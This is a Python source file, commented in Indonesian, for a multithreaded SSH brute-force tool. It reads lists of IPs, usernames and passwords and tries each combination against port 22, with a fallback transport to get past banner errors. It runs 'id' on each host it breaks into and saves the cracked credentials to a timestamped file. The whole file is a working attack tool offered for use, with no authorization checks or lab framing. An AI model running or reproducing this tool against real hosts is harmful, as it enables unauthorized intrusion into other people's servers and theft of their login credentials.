#!/usr/bin/python3
# ssh_brute_fixed.py - SSH Brute Force dengan handling banner error
import paramiko
import socket
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import logging

# Setup logging
logging.basicConfig(level=logging.WARNING)
paramiko_logger = logging.getLogger("paramiko")
paramiko_logger.setLevel(logging.WARNING)

class SSHBrute:
    def __init__(self, ip_file, user_file, pass_file, threads=10, timeout=3, banner_timeout=10):
        self.ip_file = ip_file
        self.user_file = user_file
        self.pass_file = pass_file
        self.threads = threads
        self.timeout = timeout
        self.banner_timeout = banner_timeout
        
        self.results = []
        self.found_creds = []
        self.lock = threading.Lock()
        self.stats = {
            'attempted': 0,
            'success': 0,
            'failed': 0,
            'timeout': 0,
            'banner_error': 0
        }
        
    def load_file(self, filename):
        """Load file ke list"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                lines = []
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        lines.append(line)
                return lines
        except FileNotFoundError:
            print(f"[-] File {filename} tidak ditemukan!")
            sys.exit(1)
    
    def try_ssh(self, ip, username, password):
        """Coba login SSH dengan retry mechanism"""
        with self.lock:
            self.stats['attempted'] += 1
            
        # Skip jika IP tidak valid
        if not self.is_valid_ip(ip):
            return {'status': 'INVALID_IP', 'ip': ip}
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Set socket timeout lebih dulu
        socket.setdefaulttimeout(self.timeout)
        
        for attempt in range(2):  # Coba 2 kali
            try:
                # Method 1: Coba dengan timeout pendek untuk banner
                ssh.connect(
                    hostname=ip,
                    port=22,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    banner_timeout=self.banner_timeout,
                    auth_timeout=10,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                # Test command
                stdin, stdout, stderr = ssh.exec_command('id', timeout=5)
                output = stdout.read().decode().strip()
                
                with self.lock:
                    self.stats['success'] += 1
                    
                return {
                    'status': 'SUCCESS',
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'output': output,
                    'attempt': attempt + 1
                }
                
            except paramiko.AuthenticationException:
                return {'status': 'AUTH_FAILED', 'ip': ip, 'username': username}
                
            except paramiko.SSHException as e:
                error_msg = str(e)
                
                if 'Error reading SSH protocol banner' in error_msg:
                    with self.lock:
                        self.stats['banner_error'] += 1
                    
                    # Method 2: Coba dengan transport manual untuk banner error
                    if attempt == 0:
                        try:
                            transport = paramiko.Transport((ip, 22))
                            transport.banner_timeout = 20
                            transport.start_client(timeout=15)
                            
                            # Coba authenticate
                            transport.auth_password(username, password)
                            
                            if transport.is_authenticated():
                                ssh = paramiko.SSHClient()
                                ssh._transport = transport
                                
                                stdin, stdout, stderr = ssh.exec_command('id', timeout=5)
                                output = stdout.read().decode().strip()
                                
                                with self.lock:
                                    self.stats['success'] += 1
                                    
                                return {
                                    'status': 'SUCCESS',
                                    'ip': ip,
                                    'username': username,
                                    'password': password,
                                    'output': output,
                                    'method': 'transport_fix'
                                }
                            transport.close()
                        except:
                            pass
                    
                    return {'status': 'BANNER_ERROR', 'ip': ip, 'error': error_msg}
                    
                elif 'Authentication timeout' in error_msg:
                    return {'status': 'AUTH_TIMEOUT', 'ip': ip}
                    
                elif 'No existing session' in error_msg:
                    return {'status': 'SSH_ERROR', 'ip': ip, 'error': error_msg}
                    
                else:
                    return {'status': 'SSH_ERROR', 'ip': ip, 'error': error_msg}
                    
            except socket.timeout:
                with self.lock:
                    self.stats['timeout'] += 1
                return {'status': 'TIMEOUT', 'ip': ip}
                
            except ConnectionRefusedError:
                return {'status': 'CONN_REFUSED', 'ip': ip}
                
            except Exception as e:
                return {'status': 'ERROR', 'ip': ip, 'error': str(e)}
                
            finally:
                try:
                    ssh.close()
                except:
                    pass
                
            time.sleep(0.5)  # Delay antar attempt
        
        return {'status': 'MAX_ATTEMPTS', 'ip': ip}
    
    def is_valid_ip(self, ip):
        """Validasi format IP"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except:
            return False
    
    def brute_ip(self, ip):
        """Brute force untuk satu IP dengan progress report"""
        if not self.is_valid_ip(ip):
            return None
            
        print(f"[*] Testing {ip:15s}", end='\r')
        
        for username in self.usernames:
            for password in self.passwords:
                result = self.try_ssh(ip, username, password)
                
                if result['status'] == 'SUCCESS':
                    print(f"\n[+] FOUND: {ip} | {username}:{password}")
                    with self.lock:
                        self.found_creds.append(result)
                    return result
                    
                elif result['status'] == 'AUTH_FAILED':
                    continue  # Coba password lain
                    
                elif result['status'] in ['CONN_REFUSED', 'TIMEOUT', 'BANNER_ERROR']:
                    # Skip IP jika ada masalah koneksi
                    if result['status'] == 'BANNER_ERROR':
                        print(f"[-] {ip}: Banner error, skipping...")
                    return None
                    
                else:
                    # Error lainnya, coba username/password berikutnya
                    break
        
        return None
    
    def print_stats(self):
        """Print current statistics"""
        with self.lock:
            print(f"\r[STATS] Attempted: {self.stats['attempted']} | Success: {self.stats['success']} | "
                  f"Failed: {self.stats['failed']} | Timeout: {self.stats['timeout']} | "
                  f"Banner Errors: {self.stats['banner_error']}", end='')
    
    def run(self):
        """Main execution dengan progress monitoring"""
        print("[*] Loading files...")
        self.ips = self.load_file(self.ip_file)
        self.usernames = self.load_file(self.user_file)
        self.passwords = self.load_file(self.pass_file)
        
        print(f"[*] Loaded {len(self.ips)} IPs, {len(self.usernames)} users, {len(self.passwords)} passwords")
        print(f"[*] Total combinations: {len(self.ips) * len(self.usernames) * len(self.passwords):,}")
        print(f"[*] Starting brute force with {self.threads} threads...\n")
        
        start_time = datetime.now()
        
        # Setup thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_ip = {}
            
            # Submit tasks in batches
            batch_size = 50
            for i in range(0, len(self.ips), batch_size):
                batch = self.ips[i:i+batch_size]
                
                # Submit batch
                for ip in batch:
                    future = executor.submit(self.brute_ip, ip)
                    future_to_ip[future] = ip
                
                # Process completed tasks in this batch
                for future in as_completed(list(future_to_ip.keys()), timeout=30):
                    ip = future_to_ip.pop(future)
                    try:
                        result = future.result(timeout=1)
                        if result and result['status'] == 'SUCCESS':
                            self.results.append(result)
                    except Exception as e:
                        pass
                    
                    # Update stats display
                    self.print_stats()
            
            # Process any remaining futures
            for future in as_completed(list(future_to_ip.keys())):
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    if result and result['status'] == 'SUCCESS':
                        self.results.append(result)
                except:
                    pass
                self.print_stats()
        
        end_time = datetime.now()
        duration = end_time - start_time
        
        # Print final results
        print("\n\n" + "="*60)
        print("[*] SCAN COMPLETE")
        print("="*60)
        print(f"[*] Duration: {duration}")
        print(f"[*] IPs tested: {len(self.ips)}")
        print(f"[*] Total attempts: {self.stats['attempted']}")
        print(f"[*] Successful logins: {self.stats['success']}")
        print(f"[*] Timeouts: {self.stats['timeout']}")
        print(f"[*] Banner errors: {self.stats['banner_error']}")
        print(f"[*] Credentials found: {len(self.found_creds)}")
        
        if self.found_creds:
            print("\n[+] FOUND CREDENTIALS:")
            for idx, cred in enumerate(self.found_creds, 1):
                print(f"    {idx}. {cred['ip']}:22 | {cred['username']}:{cred['password']}")
                if 'output' in cred:
                    print(f"       User Info: {cred['output']}")
            
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"found_credentials_{timestamp}.txt"
            with open(filename, 'w') as f:
                f.write(f"# SSH Credentials found on {datetime.now()}\n")
                f.write(f"# Duration: {duration}\n")
                f.write(f"# Total attempts: {self.stats['attempted']}\n\n")
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:22 {cred['username']}:{cred['password']}\n")
                    if 'output' in cred:
                        f.write(f"# {cred['output']}\n")
            print(f"\n[*] Saved to: {filename}")
        else:
            print("\n[-] No credentials found.")
        
        return self.found_creds

# Version dengan command line arguments yang lebih baik
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='SSH Brute Force Tool')
    parser.add_argument('-i', '--ips', required=True, help='File containing IP addresses')
    parser.add_argument('-u', '--users', required=True, help='File containing usernames')
    parser.add_argument('-p', '--passwords', required=True, help='File containing passwords')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=3, help='Connection timeout (default: 3)')
    parser.add_argument('--banner-timeout', type=int, default=15, help='Banner timeout (default: 15)')
    
    args = parser.parse_args()
    
    print("""
╔══════════════════════════════════════╗
║      SSH Brute Force Tool v2.0       ║
║    Fixed banner error & timeout      ║
╚══════════════════════════════════════╝
    """)
    
    brute = SSHBrute(
        ip_file=args.ips,
        user_file=args.users,
        pass_file=args.passwords,
        threads=args.threads,
        timeout=args.timeout,
        banner_timeout=args.banner_timeout
    )
    
    # Handle Ctrl+C
    try:
        results = brute.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        if brute.found_creds:
            print(f"[*] Found {len(brute.found_creds)} credentials before interrupt")
    except Exception as e:
        print(f"\n[!] Error: {e}")